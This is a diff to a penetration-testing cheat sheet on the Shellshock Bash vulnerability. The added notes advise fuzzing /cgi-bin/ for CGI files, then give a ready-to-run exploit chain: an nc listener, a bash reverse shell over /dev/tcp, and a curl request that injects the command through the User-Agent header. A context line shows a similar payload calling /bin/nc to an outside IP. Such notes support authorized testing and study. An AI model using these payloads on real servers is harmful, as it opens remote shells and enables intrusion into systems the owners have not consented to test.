@@ -1,4 +1,6 @@
 ## Shell Shock
+
+[Siren Notes](https://sirensecurity.io/blog/shellshock/)
 ### Detect
 
 ```
@@ -33,5 +35,27 @@ curl -H "User-Agent: () { :;};echo content-type:text/plain;echo;/bin/nc 51.75.29
 
 # Automatic tool : shellshocker.py
 https://github.com/liamim/shellshocker
+
+```
+
+### Siren Notes
+
+```
+"Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests."
+
+If you're on an engagement and you discover some /cgi-bin/ directory - it would be wise to fuzz for file names + ".cgi". Checking for CGI files either left behind from a default configuration or perhaps a developer who was utilizing it for debugging purposes is an important thing to check for.
+
+Lets suppose you found something like /cgi-bin/superadmin.cgi during your engagement. The first thing that should come to your mind is "I wonder if it's shellshock vulnerable?".
+
+nc -nlvp 9997
+export CMD="bash -i >& /dev/tcp/192.168.1.6/9997 0>&1"
+curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; ${CMD}; echo zzzz;'" http://example.com/cgi-bin/superadmin.cgi
+
+Shell.
+
+Here's a great reference if you want to learn more about how it works:
+https://www.troyhunt.com/everything-you-need-to-know-about2/
+
+
 
 ```
